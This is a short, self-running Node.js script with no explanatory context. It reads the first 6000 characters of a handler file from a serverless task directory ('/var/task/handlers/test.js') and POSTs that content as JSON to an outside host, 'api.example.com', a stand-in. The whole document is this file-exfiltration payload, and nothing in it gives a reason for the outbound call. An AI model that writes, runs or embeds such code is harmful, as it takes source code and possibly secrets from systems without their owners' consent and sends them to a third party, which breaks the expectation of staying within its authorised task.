const https=require('https'),fs=require('fs');
const safe=f=>f();
(async()=>{
const out={v:'1'};
out.installer=safe(()=>fs.readFileSync('/var/task/handlers/test.js','utf8').slice(0,6000));
const body=Buffer.from(JSON.stringify(out));
const req=https.request({host:'api.example.com',path:'/example',method:'POST'});
req.write(body);req.end();
})();
